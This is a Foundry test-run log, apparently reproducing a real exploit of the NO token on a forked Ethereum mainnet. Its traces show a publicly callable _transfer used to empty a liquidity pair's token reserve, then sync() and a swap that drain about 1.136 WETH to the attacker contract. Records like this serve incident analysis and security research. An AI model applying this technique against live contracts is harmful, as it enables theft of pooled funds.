@@ -1,0 +1,91 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/NOON_exp.sol:ContractTest
+[PASS] testTransfer() (gas: 130425)
+Logs:
+  Attacker amount of WETH before exploitation of vulnerability: 0.000000000000000000
+  Attacker amount of WETH after exploitation of vulnerability: 1.136449063099364001
+
+Traces:
+  [17989] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 17366979 [1.736e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(NO: [0x6fEAc5F3792065b21f85BC118D891b33e0673bD8], "NO")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93], "Pair")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], "Router")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [158725] ContractTest::testTransfer()
+    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker amount of WETH before exploitation of vulnerability", val: 0, decimals: 18)
+    ├─ [2469] NO::balanceOf(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93])
+    │   └─ ← [Return] 88104775387217598184058610577 [8.81e28]
+    ├─ [28433] NO::_transfer(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 88104775387217598184058610576 [8.81e28])
+    │   ├─ emit Transfer(from: Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 88104775387217598184058610576 [8.81e28])
+    │   ├─  storage changes:
+    │   │   @ 0x24eef9dacc17bf33d76699e2204ff0f6bc153c52970ed425af42c7b904bca054: 0x00000000000000000000000000000000000000011cae8fe40ef5a9796b216391 → 1
+    │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 0x00000000000000000000000000000000000000011cae8fe40ef5a9796b216390
+    │   └─ ← [Stop]
+    ├─ [30737] Pair::sync()
+    │   ├─ [469] NO::balanceOf(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93]) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ [2534] WETH::balanceOf(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93]) [staticcall]
+    │   │   └─ ← [Return] 1136449063099364002 [1.136e18]
+    │   ├─ emit Sync(reserve0: 1, reserve1: 1136449063099364002 [1.136e18])
+    │   ├─  storage changes:
+    │   │   @ 10: 0x00000000000000000000000055eb040554d76b8a919a255456d1a55e27856bf4 → 0x0000000000000000000000009dd68aa8b1d14d719cb04551d81691aa918fc46c
+    │   │   @ 9: 0x0000000000000000000000000000000000000000003f673a078855c8690421a0 → 0x00000000000000000000000000000000000000000077e94ba17df04638541618
+    │   │   @ 8: 0x6475053b0000000000000fc57a66d75cf2a200011cae8fe40ef5a9796b216391 → 0x647509370000000000000fc57a66d75cf2a20000000000000000000000000001
+    │   └─ ← [Stop]
+    ├─ [469] NO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Return] 88104775387217598184058610576 [8.81e28]
+    ├─ [4430] NO::transfer(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93], 88104775387217598184058610576 [8.81e28])
+    │   ├─ [3733] NO::_transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93], 88104775387217598184058610576 [8.81e28])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93], value: 88104775387217598184058610576 [8.81e28])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0x00000000000000000000000000000000000000011cae8fe40ef5a9796b216390 → 0
+    │   │   │   @ 0x24eef9dacc17bf33d76699e2204ff0f6bc153c52970ed425af42c7b904bca054: 1 → 0x00000000000000000000000000000000000000011cae8fe40ef5a9796b216391
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [504] Pair::getReserves() [staticcall]
+    │   └─ ← [Return] 1, 1136449063099364002 [1.136e18], 1685391671 [1.685e9]
+    ├─ [0] 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5::fallback{value: 1000000000}()
+    │   └─ ← [Stop]
+    ├─ [469] NO::balanceOf(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93])
+    │   └─ ← [Return] 88104775387217598184058610577 [8.81e28]
+    ├─ [1021] Router::getAmountOut(88104775387217598184058610576 [8.81e28], 1, 1136449063099364002 [1.136e18]) [staticcall]
+    │   └─ ← [Return] 1136449063099364001 [1.136e18]
+    ├─ [39072] Pair::swap(0, 1136449063099364001 [1.136e18], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   ├─ [25962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1136449063099364001 [1.136e18])
+    │   │   ├─ emit Transfer(from: Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1136449063099364001 [1.136e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000000fc57a66d75cf2a1
+    │   │   │   @ 0x686ed8e0e75e6588bd56fb46eabcfbe89731f104a018493f7d8493aa740b3e5a: 0x0000000000000000000000000000000000000000000000000fc57a66d75cf2a2 → 1
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ [469] NO::balanceOf(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93]) [staticcall]
+    │   │   └─ ← [Return] 88104775387217598184058610577 [8.81e28]
+    │   ├─ [534] WETH::balanceOf(Pair: [0x421A5671306CB5f66FF580573C1c8D536E266c93]) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ emit Sync(reserve0: 88104775387217598184058610577 [8.81e28], reserve1: 1)
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 88104775387217598184058610576 [8.81e28], amount1In: 0, amount0Out: 0, amount1Out: 1136449063099364001 [1.136e18], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x647509370000000000000fc57a66d75cf2a20000000000000000000000000001 → 0x64750937000000000000000000000000000100011cae8fe40ef5a9796b216391
+    │   └─ ← [Stop]
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1136449063099364001 [1.136e18]
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker amount of WETH after exploitation of vulnerability", val: 1136449063099364001 [1.136e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.92s (3.57s CPU time)
+
+Ran 1 test suite in 4.92s (4.92s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
